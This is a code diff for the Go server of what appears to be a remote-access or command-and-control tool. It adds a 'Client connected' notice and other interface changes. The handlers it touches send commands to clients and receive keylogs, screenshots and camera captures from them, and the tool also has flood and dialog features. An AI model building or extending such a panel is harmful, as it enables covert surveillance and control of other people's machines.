@@ -61,6 +61,8 @@ var client_dialogoutput map[string]string = make(map[string]string)
 var should_screenshot bool = false
 var should_takepic bool = false
 
+var header string = ""
+
 var banner string = `
 ▄▄▄       ██ ▄█▀ ██▓ ██▓    ▄▄▄█████▓
 ▒████▄     ██▄█▒ ▓██▒▓██▒    ▓  ██▒ ▓▒
@@ -133,6 +135,8 @@ func Contains(sl []string, name string) bool {
 
 func (s *server) GetCommand(ctx context.Context, cid *pb.ClientDataRequest) (*pb.ClientExecData, error) {
 	if !Contains(client_ids, cid.ClientId) {
+		header = color.GreenString("Client connected with id %s", cid.ClientId)
+
 		client_ids = append(client_ids, cid.ClientId)
 	}
 
@@ -159,6 +163,7 @@ func (s *server) SetCommandOutput(ctx context.Context, in *pb.ClientExecOutput) 
 
 func (s *server) SubscribeOnScreenText(r *pb.ClientDataRequest, in pb.Consumer_SubscribeOnScreenTextServer) error {
 	if !Contains(client_ids, r.ClientId) {
+		header = color.GreenString("Client connected with id %s", r.ClientId)
 		client_ids = append(client_ids, r.ClientId)
 	}
 	for {
@@ -192,6 +197,8 @@ func (s *server) GetFlood(ctx context.Context, in *pb.Void) (*pb.FloodData, erro
 
 func (s *server) GetDialog(ctx context.Context, in *pb.ClientDataRequest) (*pb.DialogData, error) {
 	if !Contains(client_ids, in.ClientId) {
+		header = color.GreenString("Client connected with id %s", in.ClientId)
+
 		client_ids = append(client_ids, in.ClientId)
 	}
 
@@ -222,9 +229,7 @@ func (s *server) SetDialogOutput(ctx context.Context, in *pb.DialogOutput) (*pb.
 }
 
 func (s *server) GetScreen(ctx context.Context, in *pb.ClientDataRequest) (*pb.ScreenData, error) {
-	if !Contains(client_ids, in.ClientId) {
-		client_ids = append(client_ids, in.ClientId)
-	}
+	header = color.GreenString("Client connected with id %s", in.ClientId)
 
 	if in.ClientId == current_id {
 		ss := should_screenshot
@@ -236,6 +241,8 @@ func (s *server) GetScreen(ctx context.Context, in *pb.ClientDataRequest) (*pb.S
 
 func (s *server) SetScreenOutput(ctx context.Context, in *pb.ScreenOutput) (*pb.Void, error) {
 	if !Contains(client_ids, in.Id.ClientId) {
+		header = color.GreenString("Client connected with id %s", in.Id.ClientId)
+
 		client_ids = append(client_ids, in.Id.ClientId)
 	}
 
@@ -257,6 +264,7 @@ func (s *server) SetScreenOutput(ctx context.Context, in *pb.ScreenOutput) (*pb.
 
 func (s *server) SetKeylogOutput(ctx context.Context, in *pb.KeylogOutput) (*pb.Void, error) {
 	if !Contains(client_ids, in.Id.ClientId) {
+		header = color.GreenString("Client connected with id %s", in.Id.ClientId)
 		client_ids = append(client_ids, in.Id.ClientId)
 	}
 
@@ -391,7 +399,6 @@ func (m model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 	case tea.KeyMsg:
 		switch msg.String() {
 		case "ctrl+c":
-			os.Exit(0)
 			return m, tea.Quit
 
 		case "esc", "q":
@@ -598,6 +605,9 @@ func (m model) View() string {
 	if m.showdialogoutput {
 		return m.textInput.View() + "\n\n" + client_dialogoutput[current_id]
 	}
-
-	return color.RedString(banner) + "\n" + m.textInput.View()
+	go func() {
+		time.Sleep(5 * time.Second)
+		header = ""
+	}()
+	return header + "\n\n" + color.RedString(banner) + "\n" + m.textInput.View()
 }
